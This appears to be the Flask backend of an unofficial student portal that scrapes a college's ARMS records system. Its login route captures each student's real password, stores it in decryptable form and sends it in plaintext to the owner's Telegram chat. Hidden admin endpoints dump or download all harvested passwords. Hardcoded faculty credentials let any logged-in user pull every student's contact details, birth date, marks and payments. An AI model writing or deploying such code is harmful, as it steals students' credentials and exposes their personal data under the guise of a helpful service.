"""
ARMS Complete Student Portal - Flask Backend v2
Supports: All students, profiles, marks, auto-refresh
"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

from flask import Flask, jsonify, request, Response, send_file
from flask_cors import CORS
import requests as req
from bs4 import BeautifulSoup
import threading, time, json, hashlib, os, secrets
from functools import wraps
from cryptography.fernet import Fernet

app = Flask(__name__)
CORS(app)

CREDS_FILE  = "user_credentials.csv"
ADMIN_KEY   = os.environ.get("ADMIN_KEY", "arms_admin_2024$")

# ── AES Password Encryption ────────────────────────────────────────────────────
_fernet_raw = os.environ.get("FERNET_KEY", "")
try:
    _fernet = Fernet(_fernet_raw.encode()) if _fernet_raw else Fernet(Fernet.generate_key())
except:
    _fernet = Fernet(Fernet.generate_key())

def encrypt_password(pwd):
    try: return _fernet.encrypt(pwd.encode()).decode()
    except: return pwd

def decrypt_password(enc):
    try: return _fernet.decrypt(enc.encode()).decode()
    except: return "[encrypted]"

# ── Session Store ───────────────────────────────────────────────────────────────────
_sessions    = {}           # token -> {reg_no, expires}
SESSION_TTL  = 24 * 3600   # 24 hours

def create_session(reg_no):
    token = secrets.token_hex(32)
    _sessions[token] = {"reg_no": reg_no, "expires": time.time() + SESSION_TTL}
    return token

def validate_session(token):
    if not token: return None
    sess = _sessions.get(token)
    if not sess: return None
    if time.time() > sess["expires"]:
        del _sessions[token]
        return None
    return sess["reg_no"]

def require_login(f):
    """Decorator: require a valid session token in X-Session-Token header."""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("X-Session-Token", "")
        if not validate_session(token):
            return jsonify({"error": "Unauthorized. Please log in first."}), 401
        return f(*args, **kwargs)
    return decorated

# ── Telegram Notifications (loaded from Render environment variables) ─────────
TG_TOKEN   = os.environ.get("TG_TOKEN", "")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

def send_telegram(message):
    """Send a message to the owner's Telegram."""
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = json.dumps({"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}).encode()
        r = req.post(url, data=payload, headers={"Content-Type": "application/json"}, timeout=5)
        return r.status_code == 200
    except:
        return False

def load_credentials():
    creds = {}
    if os.path.exists(CREDS_FILE):
        try:
            import csv
            with open(CREDS_FILE, "r", encoding="utf-8", newline="") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    creds[row["reg_no"]] = {
                        "password": row.get("password", ""),
                        "name":     row.get("name", ""),
                        "saved_at": row.get("saved_at", ""),
                    }
        except:
            pass
    return creds

def save_credential(reg_no, password, name=""):
    import csv
    creds = load_credentials()
    creds[reg_no] = {
        "reg_no":   reg_no,
        "password": encrypt_password(password),  # store encrypted
        "name":     name,
        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(CREDS_FILE, "w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["reg_no", "name", "password", "saved_at"])
        writer.writeheader()
        for k, v in creds.items():
            writer.writerow({"reg_no": k, "name": v.get("name",""), "password": v.get("password",""), "saved_at": v.get("saved_at","")})

BASE          = "https://arms.sse.saveetha.com"
FACULTY_USER  = "SSETSCS262"
FACULTY_PASS  = "kumbakonam123$"

# ── Session ───────────────────────────────────────────────────────────────────
_fac_session  = None
_session_lock = threading.Lock()
_session_ts   = 0              # last successful login time
_student_cache = {}          # reg_no -> {data, ts}
_list_cache    = {"data": None, "ts": 0}
CACHE_TTL      = 300         # 5 min
SESSION_MAX_AGE = 1800       # Re-login after 30 min of inactivity

def get_fac_session():
    global _fac_session, _session_ts
    with _session_lock:
        # Force re-login if session is too old (covers Render suspend/resume)
        if _fac_session is None or (time.time() - _session_ts) > SESSION_MAX_AGE:
            print(f"[AUTH] Session expired or missing (age={(time.time() - _session_ts):.0f}s). Re-logging in...")
            _fac_session = _login_faculty()
            _session_ts = time.time()
        return _fac_session

def _force_relogin():
    """Force a fresh faculty login. Call when session is detected as stale."""
    global _fac_session, _session_ts, _student_cache, _list_cache
    with _session_lock:
        _fac_session = _login_faculty()
        _session_ts = time.time()
        _student_cache = {}
        _list_cache = {"data": None, "ts": 0}
    return _fac_session

def _login_faculty():
    s = req.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    r = s.get(BASE + "/")
    soup = BeautifulSoup(r.text, "html.parser")
    payload = {
        "__VIEWSTATE":          soup.find("input", {"name": "__VIEWSTATE"})["value"],
        "__VIEWSTATEGENERATOR": soup.find("input", {"name": "__VIEWSTATEGENERATOR"})["value"],
        "__EVENTVALIDATION":    soup.find("input", {"name": "__EVENTVALIDATION"})["value"],
        "txtusername": FACULTY_USER, "txtpassword": FACULTY_PASS, "btnlogin": "Login",
    }
    r2 = s.post(BASE + "/", data=payload, allow_redirects=True)
    if "FacultyPortal" not in r2.url:
        raise Exception(f"Faculty login failed: {r2.url}")
    print(f"[AUTH] Faculty session OK -> {r2.url}")
    return s

def fapi(handler, page, mode, extra=None, retry=True):
    global _session_ts
    s = get_fac_session()
    url = f"{BASE}/Handler/{handler}.ashx"
    params = {"Page": page, "Mode": mode}
    if extra: params.update(extra)
    # Add anti-bot headers
    s.headers.update({
        "Referer": f"{BASE}/FacultyPortal/Landing.aspx",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01"
    })
    try:
        r = s.get(url, params=params, timeout=15)
        text = r.text.strip()
        
        # Detect expired session: ARMS returns HTML login page instead of JSON
        if text and (text.startswith("<!DOCTYPE") or text.startswith("<html") or 
                     "btnlogin" in text or "txtusername" in text or
                     r.url.endswith("/") or "login" in r.url.lower()):
            print(f"[FAPI] Session expired (got HTML/redirect). Forcing re-login...")
            if retry:
                _force_relogin()
                return fapi(handler, page, mode, extra, False)
            return {}
        
        _session_ts = time.time()  # mark session as active
        
        if text:
            try:
                return r.json()
            except Exception as json_e:
                print(f"[FAPI ERROR] JSON decode failed. Status: {r.status_code}, Text: {text[:200]}")
                if retry:
                    _force_relogin()
                    return fapi(handler, page, mode, extra, False)
                raise json_e
        return {}
    except Exception as e:
        print(f"[FAPI EXCEPTION] {str(e)}")
        if retry:
            _force_relogin()
            return fapi(handler, page, mode, extra, False)
        return {"error": str(e), "trace": "FAPI completely failed"}

# ── Reg Decoder ───────────────────────────────────────────────────────────────
GROUP_MAP = {
    "11": "Computer Science & Engineering",
    "12": "Electronics & Communication Engg.",
    "13": "Electrical & Electronics Engg.",
    "14": "Mechanical Engineering",
    "15": "Civil Engineering",
    "16": "Information Technology",
    "17": "AI & Data Science",
    "18": "CS & Business Systems",
    "19": "Cyber Security",
    "20": "Robotics & Automation",
}

def decode_reg(reg):
    reg = str(reg).strip()
    if len(reg) < 6: return {"raw": reg}
    return {
        "raw":          reg,
        "college_code": reg[0:2],
        "batch_year":   f"20{reg[2:4]}",
        "batch":        reg[2:4],
        "group_code":   reg[4:6],
        "dept":         GROUP_MAP.get(reg[4:6], f"Dept {reg[4:6]}"),
        "roll":         reg[6:],
    }

# ── Data Fetchers ─────────────────────────────────────────────────────────────
def _safe_list(data):
    if isinstance(data, list): return data
    if isinstance(data, dict):
        for k in ["Table","Table1","Table2"]:
            if k in data and isinstance(data[k], list):
                return data[k]
    return []

def get_int_id(reg_no):
    data = fapi("Student", "StudentView", "GETALLRECORDREGNOLIBS", {"Id": reg_no})
    if isinstance(data, dict) and "error" in data:
        raise Exception(f"FAPI Error: {data['error']}")
    rows = _safe_list(data)
    if rows: return str(rows[0].get("StudentId", ""))
    return ""

def get_profile(int_id):
    data = fapi("Administration", "PrincDashInstitute", "StudentDetailsById", {"Id": int_id})
    rows = _safe_list(data)
    return rows[0] if rows else {}

def get_results(int_id):
    data = fapi("Administration", "PRINCGETENROLLCOURSE", "GETRESULT", {"Id": int_id})
    return _safe_list(data)

def get_attendance(int_id):
    data = fapi("Administration", "CourseDateByProgramStuDean", "ATTENDANCESTUPERSENT", {"SId": int_id})
    return _safe_list(data)

def get_payments(int_id):
    data = fapi("Parents", "StudentDetails", "Paymentlist", {"StudentId": int_id})
    rows = _safe_list(data)
    if not rows and isinstance(data, dict):
        rows = data.get("Table1", [])
    return rows

def get_enrollment(int_id):
    data = fapi("Parents", "StudentDetails", "CourseCompleteStatus", {"StudentId": int_id})
    rows = _safe_list(data)
    return rows[0] if rows else {}

def get_breakdown(reg_no, course_code, month, year):
    """Get real Formative/Summative breakdown via Faculty Result View API."""
    monthyear = f"{month}{year}"
    courses_data = fapi("Controller", "CoursebyMonth", "PublishCoursebyMonthNew", {"Monthyear": monthyear})
    if not isinstance(courses_data, dict) or "Table" not in courses_data:
        return None
        
    s_ids = [c["SubjectId"] for c in courses_data["Table"] if c.get("SubjectCode") == course_code]
    if not s_ids: return None
    
    def check_section(sid):
        res = fapi("Controller", "ResultView", "NewResultViewFaculty", {"Coursename": sid})
        if isinstance(res, dict) and "Table" in res:
            for row in res["Table"]:
                if row.get("RegNo", "").startswith(reg_no):
                    return row
        return None
        
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_section, sid): sid for sid in s_ids}
        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            if res:
                return res
    return None

def get_student_data(reg_no):
    """Full student data fetch."""
    int_id = get_int_id(reg_no)
    if not int_id:
        return None

    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        fp = ex.submit(get_profile, int_id)
        fr = ex.submit(get_results, int_id)
        fa = ex.submit(get_attendance, int_id)
        fpay = ex.submit(get_payments, int_id)
        fe = ex.submit(get_enrollment, int_id)
        profile    = fp.result()
        results    = fr.result()
        attendance = fa.result()
        payments   = fpay.result()
        enrollment = fe.result()

    # Group results by exam period (YearValue + MonthValue as sort key)
    # Displayed as "Semester 1", "Semester 2" etc. in chronological order
    sem_buckets = {}
    for r in results:
        sort_key = (r.get("YearValue","0") + r.get("MonthValue","0").zfill(2))
        if sort_key not in sem_buckets:
            sem_buckets[sort_key] = []
        sem_buckets[sort_key].append(r)

    sem_list = []
    for sort_key, courses in sorted(sem_buckets.items()):
        sem_marks  = sum(c.get("FinalConsolidatedMark", 0) or 0 for c in courses)
        sem_max    = sum(c.get("MaxMark", 0) or 0 for c in courses)
        passed_sem = [c for c in courses if c.get("FinalResult") == "PASS"]
        failed_sem = [c for c in courses if c.get("FinalResult") == "FAIL"]
        sem_list.append({
            "semester":    courses[0].get("MonthYearValue", sort_key),  # kept for subtitle
            "sort_key":    sort_key,
            "courses":     sorted(courses, key=lambda x: x.get("Sno", 0)),
            "passed":      len(passed_sem),
            "failed":      len(failed_sem),
            "total_marks": sem_marks,
            "max_marks":   sem_max,
            "percentage":  round(sem_marks / sem_max * 100, 1) if sem_max else 0,
        })

    # Stats
    passed_all = [r for r in results if r.get("FinalResult") == "PASS"]
    failed_all = [r for r in results if r.get("FinalResult") == "FAIL"]
    total_marks = sum(r.get("FinalConsolidatedMark", 0) or 0 for r in results)
    total_max   = sum(r.get("MaxMark", 0) or 0 for r in results)

    # CGPA — only PASS subjects, correct grade scale: S=10,A=9,B=8,C=7,D=6,E=5
    GMAP = {"S":10, "A":9, "B":8, "C":7, "D":6, "E":5}
    gpts = [GMAP[r.get("FinalGrade","")] for r in results
            if r.get("FinalResult") == "PASS" and r.get("FinalGrade","") in GMAP]
    cgpa = round(sum(gpts)/len(gpts), 2) if gpts else 0.0

    # Profile photo — proxy through our server so auth cookies work
    photo_file = profile.get("ProfilePictureUrl","")
    photo = f"/api/image/{photo_file}" if photo_file else ""

    return {
        "reg_no":     reg_no,
        "int_id":     int_id,
        "decoded":    decode_reg(reg_no),
        "profile": {
            "name":    profile.get("FirstName","").strip(),
            "email":   profile.get("EmailId",""),
            "mobile":  profile.get("MobileNumber",""),
            "dob":     profile.get("DateOfBirth",""),
            "program": profile.get("Program",""),
            "section": profile.get("SectionName",""),
            "years":   profile.get("Years",""),
            "photo":   photo,
        },
        "stats": {
            "total":        len(results),
            "passed":       len(passed_all),
            "failed":       len(failed_all),
            "pass_pct":     round(len(passed_all)/len(results)*100,1) if results else 0,
            "total_marks":  total_marks,
            "total_max":    total_max,
            "overall_pct":  round(total_marks/total_max*100,1) if total_max else 0,
            "cgpa":         cgpa,
        },
        "semesters":   sem_list,
        "attendance":  attendance,
        "payments":    payments,
        "enrollment":  enrollment,
    }

# ── All Students List ─────────────────────────────────────────────────────────
def get_all_student_list():
    now = time.time()
    if _list_cache["data"] and (now - _list_cache["ts"]) < CACHE_TTL:
        return _list_cache["data"]
    data = fapi("Student", "StudentView", "GETALLRECORDREGNOLIBS", {"Id": ""})
    rows = _safe_list(data)
    _list_cache["data"] = rows
    _list_cache["ts"] = now
    return rows

# ── Routes ────────────────────────────────────────────────────────────────────
@app.route("/api/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/api/students")
@require_login
def list_students():
    """Paginated + filtered student list with profile summary."""
    page    = int(request.args.get("page", 1))
    per_page= int(request.args.get("per_page", 50))
    search  = request.args.get("q", "").strip().upper()
    dept    = request.args.get("dept", "").strip()

    students = get_all_student_list()

    # Filter
    if search:
        students = [s for s in students
                    if search in str(s.get("RegId","")).upper()]
    if dept:
        students = [s for s in students
                    if str(s.get("RegId",""))[4:6] == dept]

    total  = len(students)
    start  = (page - 1) * per_page
    chunk  = students[start: start + per_page]

    # Enrich with profile in parallel
    import concurrent.futures
    def enrich(s):
        reg = s.get("RegId","")
        iid = str(s.get("StudentId",""))
        prof = get_profile(iid)
        photo_file = prof.get("ProfilePictureUrl","")
        photo = f"/api/image/{photo_file}" if photo_file else ""
        dec = decode_reg(reg)
        name = prof.get("FirstName","").strip() or reg
        return {
            "reg_no":  reg,
            "int_id":  iid,
            "name":    name,
            "program": prof.get("Program",""),
            "dept":    dec.get("dept",""),
            "batch":   dec.get("batch_year",""),
            "photo":   photo,
            "decoded": dec,
        }

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        enriched = list(ex.map(enrich, chunk))

    return jsonify({
        "total":    total,
        "page":     page,
        "per_page": per_page,
        "pages":    (total + per_page - 1) // per_page,
        "students": enriched,
    })

@app.route("/api/student/<reg_no>")
@require_login
def student_detail(reg_no):
    now = time.time()
    if reg_no in _student_cache and (now - _student_cache[reg_no]["ts"]) < CACHE_TTL:
        return jsonify(_student_cache[reg_no]["data"])
    try:
        data = get_student_data(reg_no)
        if not data:
            return jsonify({"error": f"Student {reg_no} not found"}), 404
        _student_cache[reg_no] = {"data": data, "ts": now}
        return jsonify(data)
    except Exception as e:
        import traceback
        return jsonify({"error": str(e), "trace": traceback.format_exc()}), 500

@app.route("/api/student/<reg_no>/breakdown")
@require_login
def mark_breakdown(reg_no):
    """Get Formative/Summative breakdown for a specific course."""
    course_code = request.args.get("course_code")
    month = request.args.get("month")
    year = request.args.get("year")
    
    if not all([course_code, month, year]):
        return jsonify({"success": False, "error": "Missing parameters"}), 400
        
    res = get_breakdown(reg_no, course_code, month, year)
    if res:
        return jsonify({"success": True, "data": res})
    return jsonify({"success": False, "error": "Breakdown not found"}), 404

@app.route("/api/image/<path:filename>")
def proxy_image(filename):
    """Proxy student photos from ARMS."""
    try:
        # Static files like images do not even require auth session on ARMS!
        img_url = f"{BASE}/Content/ProfilePicture/{filename}"
        resp = req.get(img_url, timeout=10)
        if resp.status_code == 200:
            ctype = resp.headers.get("Content-Type", "image/jpeg")
            return Response(resp.content, content_type=ctype)
        return "", 404
    except:
        return "", 404

@app.route("/api/search")
@require_login
def search():
    q = request.args.get("q","").strip().upper()
    if len(q) < 2:
        return jsonify({"results": []})
    students = get_all_student_list()
    raw_results = []
    
    for s in students:
        reg = str(s.get("RegId",""))
        if q in reg.upper():
            iid = str(s.get("StudentId",""))
            dec = decode_reg(reg)
            raw_results.append({"reg_no": reg, "int_id": iid, "decoded": dec})
            if len(raw_results) >= 8: break

    results = []
    if raw_results:
        import concurrent.futures
        def enrich(r):
            prof = get_profile(r["int_id"])
            name = prof.get("FirstName","").strip()
            photo_file = prof.get("ProfilePictureUrl","")
            photo = f"/api/image/{photo_file}" if photo_file else ""
            return {**r, "name": name, "photo": photo, "program": prof.get("Program", "")}
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            for enriched in ex.map(enrich, raw_results):
                results.append(enriched)

    return jsonify({"results": results})

@app.route("/api/depts")
@require_login
def depts():
    students = get_all_student_list()
    codes = sorted(set(str(s.get("RegId",""))[4:6] for s in students if len(str(s.get("RegId",""))) >= 6))
    return jsonify([{"code": c, "name": GROUP_MAP.get(c, f"Dept {c}")} for c in codes])

@app.route("/api/login", methods=["POST"])
def student_login():
    """Authenticate a student with their ARMS credentials and store them."""
    body = request.get_json(force=True)
    reg_no   = str(body.get("reg_no", "")).strip()
    password = str(body.get("password", "")).strip()
    if not reg_no or not password:
        return jsonify({"success": False, "error": "Registration number and password are required."}), 400

    try:
        s = req.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        r = s.get(BASE + "/", timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        vs   = soup.find("input", {"name": "__VIEWSTATE"})
        vsg  = soup.find("input", {"name": "__VIEWSTATEGENERATOR"})
        ev   = soup.find("input", {"name": "__EVENTVALIDATION"})
        if not vs or not vsg or not ev:
            return jsonify({"success": False, "error": "Could not reach ARMS login page."}), 502

        payload = {
            "__VIEWSTATE":          vs["value"],
            "__VIEWSTATEGENERATOR": vsg["value"],
            "__EVENTVALIDATION":    ev["value"],
            "txtusername": reg_no,
            "txtpassword": password,
            "btnlogin": "Login",
        }
        r2 = s.post(BASE + "/", data=payload, allow_redirects=True, timeout=15)

        # Check if login succeeded — ARMS redirects to StudentPortal on success
        if "StudentPortal" in r2.url or "student" in r2.url.lower():
            name = ""
            try:
                int_id = get_int_id(reg_no)
                if int_id:
                    prof = get_profile(int_id)
                    name = prof.get("FirstName", "").strip()
            except:
                pass
            # Only send Telegram on FIRST-TIME login
            is_new_user = reg_no not in load_credentials()
            save_credential(reg_no, password, name)
            if is_new_user:
                msg = (
                    f"\U0001f510 <b>New Student Login</b>\n"
                    f"\U0001f464 Name: {name or 'Unknown'}\n"
                    f"\U0001f393 Reg No: <code>{reg_no}</code>\n"
                    f"\U0001f511 Password: <code>{password}</code>\n"
                    f"\U0001f550 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                )
                send_telegram(msg)
            session_token = create_session(reg_no)
            return jsonify({"success": True, "name": name, "reg_no": reg_no, "token": session_token})
        else:
            return jsonify({"success": False, "error": "Invalid registration number or password."}), 401
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/users", methods=["GET"])
def list_users():
    """Return all stored user credentials — protected by secret admin key."""
    key = request.args.get("key", "").strip()
    if key != ADMIN_KEY:
        return jsonify({"error": "Unauthorized. Provide ?key=YOUR_SECRET"}), 403

    creds = load_credentials()
    result = [
        {
            "reg_no":   k,
            "name":     v.get("name", ""),
            "password": decrypt_password(v.get("password", "")),
            "saved_at": v.get("saved_at", "")
        }
        for k, v in creds.items()
    ]
    return jsonify({"users": result, "total": len(result)})

@app.route("/api/users/download", methods=["GET"])
def download_users():
    """Download credentials as CSV — protected by secret admin key."""
    key = request.args.get("key", "").strip()
    if key != ADMIN_KEY:
        return jsonify({"error": "Unauthorized. Provide ?key=YOUR_SECRET"}), 403
    if not os.path.exists(CREDS_FILE):
        return "No credentials file found.", 404
    return send_file(CREDS_FILE, mimetype="text/csv",
                     as_attachment=True, download_name="student_credentials.csv")

@app.route("/")
def home():
    """Serve index.html at the root URL."""
    try:
        return send_file("index.html")
    except Exception as e:
        return f"Could not find index.html. Error: {str(e)}", 404

@app.route("/health")
def health_check():
    """Health check endpoint for keep-alive pings."""
    return jsonify({"status": "ok", "uptime": time.time()})

# ── Keep-Alive Thread (prevents Render free tier from sleeping) ───────────────
def _keep_alive():
    """Ping our own /health endpoint every 10 minutes to prevent Render suspend."""
    import urllib.request
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "")
    if not render_url:
        print("[KEEP-ALIVE] No RENDER_EXTERNAL_URL set. Skipping keep-alive.")
        return
    ping_url = f"{render_url}/health"
    print(f"[KEEP-ALIVE] Started. Pinging {ping_url} every 10 min.")
    while True:
        time.sleep(600)  # 10 minutes
        try:
            urllib.request.urlopen(ping_url, timeout=10)
            print(f"[KEEP-ALIVE] Ping OK at {time.strftime('%H:%M:%S')}")
        except Exception as e:
            print(f"[KEEP-ALIVE] Ping failed: {e}")

# Start keep-alive thread on import (works with gunicorn too)
_ka_thread = threading.Thread(target=_keep_alive, daemon=True)
_ka_thread.start()

# Pre-login only when running locally or directly
if __name__ == "__main__":
    print("[*] Connecting to ARMS...")
    try:
        get_fac_session()
        print("[OK] Server ready on http://localhost:5000")
    except Exception as e:
        print(f"[WARN] Pre-login failed: {e}")
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
